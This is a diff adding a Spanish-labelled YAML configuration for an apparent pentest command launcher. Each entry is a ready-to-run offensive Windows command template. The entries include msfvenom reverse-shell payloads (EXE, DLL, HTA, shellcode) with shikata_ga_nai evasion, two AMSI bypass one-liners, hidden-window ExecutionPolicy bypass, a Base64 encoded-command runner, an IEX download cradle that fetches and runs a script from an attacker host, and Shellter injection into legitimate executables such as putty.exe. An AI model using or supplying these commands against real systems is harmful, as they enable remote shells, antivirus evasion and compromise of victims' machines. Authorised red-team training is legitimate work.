@@ -1,0 +1,167 @@
+tools:
+  - name: "msfvenom - Reverse Shell EXE"
+    description: "Generar payload .exe con reverse shell"
+    command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}"
+    params:
+      - name: lhost
+        label: "LHOST (tu IP)"
+        type: text
+        placeholder: "192.168.45.5"
+      - name: lport
+        label: "LPORT"
+        type: text
+        placeholder: "4444"
+      - name: output
+        label: "Fichero de salida"
+        type: text
+        placeholder: "shell.exe"
+
+  - name: "msfvenom - Reverse Shell DLL"
+    description: "Generar payload DLL maliciosa"
+    command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f dll -o {output}"
+    params:
+      - name: lhost
+        label: "LHOST"
+        type: text
+        placeholder: "192.168.45.5"
+      - name: lport
+        label: "LPORT"
+        type: text
+        placeholder: "4444"
+      - name: output
+        label: "Fichero de salida"
+        type: text
+        placeholder: "evil.dll"
+
+  - name: "msfvenom - Encoded Payload (shikata_ga_nai)"
+    description: "Payload con encoder shikata_ga_nai para evasion basica"
+    command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -e x86/shikata_ga_nai -i {iters} -f exe -o {output}"
+    params:
+      - name: lhost
+        label: "LHOST"
+        type: text
+        placeholder: "192.168.45.5"
+      - name: lport
+        label: "LPORT"
+        type: text
+        placeholder: "4444"
+      - name: iters
+        label: "Iteraciones encoder"
+        type: text
+        placeholder: "10"
+      - name: output
+        label: "Output"
+        type: text
+        placeholder: "encoded.exe"
+
+  - name: "msfvenom - Python Shellcode"
+    description: "Generar shellcode en Python para inyeccion en memoria"
+    command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f python -v shellcode"
+    params:
+      - name: lhost
+        label: "LHOST"
+        type: text
+        placeholder: "192.168.45.5"
+      - name: lport
+        label: "LPORT"
+        type: text
+        placeholder: "4444"
+
+  - name: "msfvenom - RAW Shellcode"
+    description: "Shellcode raw para inyectores custom en C/C++"
+    command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o shellcode.bin"
+    params:
+      - name: lhost
+        label: "LHOST"
+        type: text
+        placeholder: "192.168.45.5"
+      - name: lport
+        label: "LPORT"
+        type: text
+        placeholder: "4444"
+
+  - name: "msfvenom - HTA Payload"
+    description: "Generar payload HTA para client-side attacks"
+    command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f hta-psh -o {output}"
+    params:
+      - name: lhost
+        label: "LHOST"
+        type: text
+        placeholder: "192.168.45.5"
+      - name: lport
+        label: "LPORT"
+        type: text
+        placeholder: "4444"
+      - name: output
+        label: "Output"
+        type: text
+        placeholder: "evil.hta"
+
+  - name: "AMSI Bypass - PowerShell (Patch)"
+    description: "Bypass de AMSI en memoria via reflection (PowerShell)"
+    command: "$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if ($b.Name -like '*iUtils'){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if ($e.Name -like '*Context'){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)"
+    params: []
+
+  - name: "AMSI Bypass - String Concat"
+    description: "Bypass AMSI dividiendo la string de deteccion"
+    command: "[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41424344)"
+    params: []
+
+  - name: "PowerShell Execution Policy Bypass"
+    description: "Ejecutar scripts sin restriccion de ExecutionPolicy"
+    command: "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File {script}"
+    params:
+      - name: script
+        label: "Script .ps1"
+        type: text
+        placeholder: "C:\\temp\\evil.ps1"
+
+  - name: "PowerShell Encoded Command"
+    description: "Ejecutar PS1 codificado en Base64 para evasion"
+    command: "powershell.exe -EncodedCommand {b64cmd}"
+    params:
+      - name: b64cmd
+        label: "Comando en Base64"
+        type: text
+        placeholder: "SQBFAFgA..."
+
+  - name: "Download Cradle - IEX"
+    description: "Descargar y ejecutar PS1 desde URL en memoria"
+    command: "IEX (New-Object Net.WebClient).DownloadString('http://{lhost}/{script}')"
+    params:
+      - name: lhost
+        label: "LHOST (servidor HTTP)"
+        type: text
+        placeholder: "192.168.45.5"
+      - name: script
+        label: "Script PS1"
+        type: text
+        placeholder: "shell.ps1"
+
+  - name: "Shellter - Inject into Legit PE"
+    description: "Inyectar shellcode en PE legitimo con Shellter"
+    command: "shellter -a -f {target_exe}"
+    params:
+      - name: target_exe
+        label: "PE legitimo"
+        type: text
+        placeholder: "putty.exe"
+
+  - name: "Python HTTP Server (servir payloads)"
+    description: "Levantar servidor HTTP simple para servir payloads"
+    command: "python3 -m http.server {port}"
+    params:
+      - name: port
+        label: "Puerto"
+        type: text
+        placeholder: "8080"
+
+  - name: "Check AV Products (WMIC)"
+    description: "Enumerar productos AV instalados en Windows"
+    command: "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname,productstate"
+    params: []
+
+  - name: "msfvenom - List Payloads Windows"
+    description: "Listar payloads disponibles para Windows"
+    command: "msfvenom -l payloads | grep -i windows"
+    params: []
